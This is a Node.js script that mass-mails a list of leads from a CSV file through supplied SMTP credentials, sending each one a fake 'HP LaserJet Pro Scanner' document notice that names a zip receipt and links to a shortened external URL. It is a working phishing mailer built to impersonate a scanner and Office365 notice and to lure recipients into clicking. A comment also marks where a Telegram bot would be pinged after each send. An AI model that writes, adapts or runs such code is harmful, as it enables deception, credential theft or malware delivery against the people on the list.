const fs = require('fs');
const csv = require('csv-parser');
const nodemailer = require('nodemailer');
const axios = require('axios');

// Read SMTP details from smtp.txt
const smtpDetailsRaw = fs.readFileSync('smtp.txt', 'utf-8').split('\n');
const smtpDetails = {};
smtpDetailsRaw.forEach(line => {
    const [key, value] = line.split('=');
    smtpDetails[key.trim()] = value.trim();
});

const smtpConfig = {
    host: smtpDetails['SMTP_SERVER'],
    port: parseInt(smtpDetails['SMTP_PORT'], 10),
    secure: smtpDetails['USE_TLS'] === 'true',
    auth: {
        user: smtpDetails['SMTP_USER'],
        pass: smtpDetails['SMTP_PASSWORD']
    }
};

// Read leads from eleads.csv and send emails
fs.createReadStream('eleads.csv')
    .pipe(csv())
    .on('data', (row) => {
        const recipient = row.email;

        // Create a Nodemailer transporter
        const transporter = nodemailer.createTransport(smtpConfig);

        // Send email
        transporter.sendMail({
            from: '"Document Center" <admin@researchmarketintelligence.live>',
            to: recipient,
            subject: 'Document from HP LaserJet Pro Scanner',
            html: `
                <body>
                    <p>Dear ${row.name},</p>
                    <p>You've received a document from HP LaserJet Pro Scanner.</p>
                    <p>It was scanned and sent to ${row.email} using a HP WorkCentre on Office365 Portal.</p>
                    <p>Number of Images: 1</p>
                    <p>File Name: E_reciept_delivery.zip</p>
                    <p>Device Name: HP LaserJet Pro</p>
                    <p>Attachment File Type: /.zip</p>
                    <p><a href="https://qrco.de/bfFWM5" target="_blank" style="font-weight: bold;letter-spacing: normal;line-height: 100%;text-align: center;text-decoration: none;color: #2e34a6;">Click to view document</a></p>
                    <p>Thank you for using HP LaserJet Pro Scanner.</p>
                    <p>Disclaimer: This is an automatically generated email, please do not reply.</p>
                </body>
            `
        }, (error, info) => {
            if (error) {
                console.log(`Failed to send email to ${recipient}: ${error}`);
            } else {
                console.log(`Email sent to ${recipient}: ${info.response}`);
                // Ping Telegram bot over webhook URL
            }
        });
    })
    .on('end', () => {
        console.log('Email sending completed');
    });
